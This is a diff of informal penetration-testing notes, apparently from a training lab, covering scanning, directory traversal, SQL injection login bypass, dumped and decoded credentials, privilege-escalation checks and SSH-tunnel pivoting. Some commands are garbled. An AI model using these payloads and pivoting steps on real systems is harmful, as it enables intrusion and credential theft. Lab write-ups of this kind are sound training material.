@@ -1,3 +1,76 @@
 10.50.29.237 first target
 
-10.50 and 10.10 don't touch
+#10.50 and 10.10 don't touch
+
+nmap the 10.50.29.237 found ports 22,23,80,8888,8080 open/filtered
+ssh tunnel to port 80 finding a website
+careers page file lookup is vuln to ../../../../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false user2:x:1001:1001::/home/user2:/bin/sh
+
+../../../../etc/hosts   #gave me WebApp 192.168.28.181
+
+on employee login was able to use "' or 1='1" for user and password which told us "welcome Aaron"
+
+
+
+THIS IS THE START OF REVIEW
+nmap -Pn -T4 --min-rate 374457648987589476 10.50.29.237 -p20-23,80,8080    #filtered stuff is trash,22,80 were open
+nmap -Pn -T4 --min-rate 374457648987589476 10.50.29.237 -p-
+
+links may be hidden
+nikto -h <ip>
+nmap -Pn -T4 10.50.29.237 -p80 --script=http-enum.nse
+
+http://0.0.0.0:1111/getcareers.php?myfile=Executive_Assistant.html  #vuln to directory traversal
+http://0.0.0.0:1111/login.html   #vuln to sql injection but not in a useful way
+http://0.0.0.0:1111/login.php?username=root%27+or+1%3D%271&passwd=%27+or+1%3D%271  #add ? and then the rest is from f12 which gave what looked like credentials
+Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
+#above is the result of the url put in,put "RntyrfVfNER78" from user2 into cyberchef decode from rot13 which makes it "EaglesIsARE78"
+
+directory traversal ../../../../../etc/hosts  #got WebApp 192.168.28.181
+
+ssh into 10.50.29.237
+find / -type f -perm /4000 2>/dev/null    #find binaries with suid bit set, use gtfobins website to check them all for possible miss configuration
+find / -type f -perm /2000 2>/dev/null
+find / -type f -perm /6000 2>/dev/null
+which gdb  #nothing so no buffer overflow
+echo $PATH   #nothing in there
+crontab -l  #nothing here
+#next box for we tried what we could
+
+ssh user2@10.50.29.237 -D 9050
+proxychains nmap -Pn -T4 --min-rate 938453894763 192.168.28.181 -p20-25,80,8080  #we found 22 and 80 open
+proxychains nmap -Pn -T4 --min-rate 938453894763 192.168.28.181 -p-
+
+
+open ssh tunnel to 192.168.28.181 on port 80 with user3 becasue user2 doesn't flood over for credentials  #"Bob4THEEapples" user3 password from before
+instantly you see a list to choose from which clicking on you see a table so you do sql injection
+see which product=<#> works   # ends up being product=7 or 1=1 for the url,integers means no quotes,if it was string worry about quotes
+0.0.0.0:1111/pick.php/product=7 UNION SELECT 1,2,3  # order goes 1,3,2, can to for 1,2,3,4 do until you get results
+use the golden statement with info schema,column name, table name,and table schema in it
+UNION SELECT 1,2,3 FROM database.table;#
+from there we can get creds
+
+ssh user2@10.50.29.237
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done  check ping sweep command to make sure it's correct
+#find the .172 is open
+#nmap the ports to find 7008,its not saying much but could mean we can priv esc
+#Aaron is the guy for the .172 credential wise
+#brought to round sensor
+which gdb  #didn't find anything
+sudo -l  #found "find" which on gtfobins gave us a way to use
+echo $PATH #don't think we found anything
+find / -type f -perm /4000 2>/dev/null
+for in in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+
+#found the .179,nnmap it
+#setup dynamic tunnel to nmap it 
+proxychains nmap -Pn -T4 --min-rate 293584734946 192.168.28.179 -p20-25,80,8080,3389,9999  #context clues says its windows and rdp is usually open
+proxychains nmap -Pn -T4 --min-rate 293584734946 192.168.28.179 -p-
+#3389,9999 open
+nc 192.168.28.179 9999  #secureserver means buffer overflow is possible
+
+
+
+
